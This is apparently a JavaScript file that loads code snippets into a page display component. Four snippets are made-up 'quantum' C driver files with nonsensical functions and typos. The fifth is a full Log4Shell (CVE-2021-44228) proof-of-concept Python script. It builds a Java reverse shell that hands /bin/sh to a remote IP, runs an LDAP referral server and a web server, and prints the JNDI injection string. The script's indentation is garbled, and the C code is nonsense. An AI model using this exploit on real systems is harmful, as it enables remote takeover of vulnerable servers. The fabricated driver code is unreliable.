var codeFiles = [
`// CMDR.sys
// Copyright Objective Research Laboratories 1993
#include <particle.h>
#include <quantum.h>
#include <boson.h>
#include <quark.h>
#include <hadron.h>
#include <lepton.h>

volatile uint128_t UNCBM q_get_spin(uint128_t previous, CLTR cltr, struct Energy en)
{
    uint8_t ring = 0x3F;
    uncouple(en, &ring);
    free_q(en);
    while (previous)
    {
        CLSSR clssr = cltr_clssr(cltr);
        ring |= cltr_super(clssr);
        previous = cltr_prev(cltr);
    }
    return ring;
}

volatile uint128_t UNCBM q_get_sposition(uint128_t previous, CLTR cltr, struct Position pos)
{
    uint8_t ring = 0x3C;
    uncouple(pos, &ring);
    free_q(pos);
    while (previous)
    {
        CLSSR clssr = cltr_clssr(cltr);
        ring |= cltr_super(clssr);
        previous = cltr_prev(cltr);
    }
    return ring;
}

volatile void* UNCBM q_init(uint128_t id, CLTR cltr, void* buffer)
{
    uint8_t init_flags = q_malloc(sizeof(struct Energy) + sizeof(struct Position), buffer);
    uint8_t ring = cltr_register(init_flags, buffer);
    cltr_assert(id, ring);
    return buffer;
}

`,
`// MDVR.sys
// Copyright Objective Research Laboratories 1993
#include <particle.h>
#include <quantum.h>

extern union Q
{
    struct Position* pos;
    struct Energy* en;
};

volatile void q_transit(union Q* entry, union Q* exit)
{
    #BEGIN_PARALLEL
    Q_FLOAT angle = q_angle(entry, exit);
    Q_FLOAT distance = q_distance(entry, exit);
    #END_PARALLEL
    _transform_(ange, distance);
}
`,
`// LNDR.sys
// Copyright Objective Research Laboratories 1993
#include <stdio.h>
#include <quantum.h>

volatile uint128_t safe_disengage()
{
    uint128_t stability = compute_stability();
    while (stability > Q_MAX_STABILITY)
    {
        decelerate();
        stability = compute_stability();
    }
    if (g_speed == Q_FLOAT_ZERO)
    {
        printf("Safe Disengage Complete\\n");
    }
    return stability;
}

volatile uint128_t safe_engage()
{
    uint128_t base_stability = compute_stability();
    uint128_t stability;
    while (stability < Q_MAX_STABILITY + Q_FLOAT_ONE)
    {
        accelerate();
        stability = compute_stability(base_stability);
    }
    if (g_speed == Q_FLOAT_INF)
    {
        printf("Safe Engage Complete\\n");
    }
    return stability;
}
`,
`// HWND.sys
// Copyright Objective Research Laboratories 1993
#include <particle.h>
#include <quantum.h>

volatile void* q_alloc_junction(Q_FLOAT distance, Q_FLOAT angle)
{
    void* junction = pool_alloc(sizeof(struct Junction));
    init_junction(junction, distance, angle);
    return junction;
}

volatile void q_free_junction(void* junction)
{
    clean_junction(junction);
    pool_free(junction);
}

`,
`
# 4J.py
#!/usr/bin/env python3

import argparse
from colorama import Fore, init
import subprocess
import threading
from pathlib import Path
import os
from http.server import HTTPServer, SimpleHTTPRequestHandler

CUR_FOLDER = Path(__file__).parent.resolve()


def generate_payload(userip: str, lport: int) -> None:
    program = """
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit {

    public Exploit() throws Exception {
    String host="%s";
    int port=%d;
    String cmd="/bin/sh";
    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
    Socket s=new Socket(host,port);
    InputStream pi=p.getInputStream(),
    pe=p.getErrorStream(),
    si=s.getInputStream();
    OutputStream po=p.getOutputStream(),so=s.getOutputStream();
    while(!s.isClosed()) {
    while(pi.available()>0)
    so.write(pi.read());
    while(pe.available()>0)
    so.write(pe.read());
    while(si.available()>0)
    po.write(si.read());
    so.flush();
    po.flush();
    Thread.sleep(50);
    try {
    p.exitValue();
    break;
}
catch (Exception e){
}
};
p.destroy();
s.close();
}
}
""" % (userip, lport)

# writing the exploit to Exploit.java file

p = Path("Exploit.java")

try:
p.write_text(program)
subprocess.run([os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/javac"), str(p)])
except OSError as e:
    print(Fore.RED + f'[-] Something went wrong {e}')
raise e
else:
print(Fore.GREEN + '[+] Exploit java class created success')


def payload(userip: str, webport: int, lport: int) -> None:
    generate_payload(userip, lport)

print(Fore.GREEN + '[+] Setting up LDAP server\n')

# create the LDAP server on new thread
t1 = threading.Thread(target=ldap_server, args=(userip, webport))
t1.start()

# start the web server
print(f"[+] Starting Webserver on port {webport} http://0.0.0.0:{webport}")
httpd = HTTPServer(('0.0.0.0', webport), SimpleHTTPRequestHandler)
httpd.serve_forever()


def check_java() -> bool:
    exit_code = subprocess.call([
        os.path.join(CUR_FOLDER, 'jdk1.8.0_20/bin/java'),
        '-version',
    ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
return exit_code == 0


def ldap_server(userip: str, lport: int) -> None:
    sendme = "{jndi:ldap://%s:1389/a}" % (userip)
print(Fore.GREEN + f"[+] Send me: {sendme}\n")

url = "http://{}:{}/#Exploit".format(userip, lport)
subprocess.run([
    os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/java"),
    "-cp",
    os.path.join(CUR_FOLDER, "target/marshalsec-0.0.3-SNAPSHOT-all.jar"),
    "marshalsec.jndi.LDAPRefServer",
    url,
])


def main() -> None:
    init(autoreset=True)
print(Fore.BLUE + """
    [!] CVE: CVE-2021-44228
    [!] Github repo: https://github.com/kozmer/log4j-shell-poc
    """)

parser = argparse.ArgumentParser(description='log4shell PoC')
parser.add_argument('--userip',
    metavar='userip',
    type=str,
default='localhost',
    help='Enter IP for LDAPRefServer & Shell')
parser.add_argument('--webport',
    metavar='webport',
    type=int,
default='8000',
    help='listener port for HTTP port')
parser.add_argument('--lport',
    metavar='lport',
    type=int,
default='9001',
    help='Netcat Port')

args = parser.parse_args()

try:
if not check_java():
print(Fore.RED + '[-] Java is not installed inside the repository')
raise SystemExit(1)
payload(args.userip, args.webport, args.lport)
except KeyboardInterrupt:
    print(Fore.RED + "user interrupted the program.")
raise SystemExit(0)


if __name__ == "__main__":
main()
`
];

for (var i = 0; i < codeFiles.length; i++) {
    codeFiles[i] = codeFiles[i].replace(/</g, '&lt;');
    codeFiles[i] = codeFiles[i].replace(/>/g, '&gt;');
}

layout.registerComponent( 'codeComponent', function(container, componentState){
    container.getElement().html('<pre class="log" id="code-file"></pre>');
});
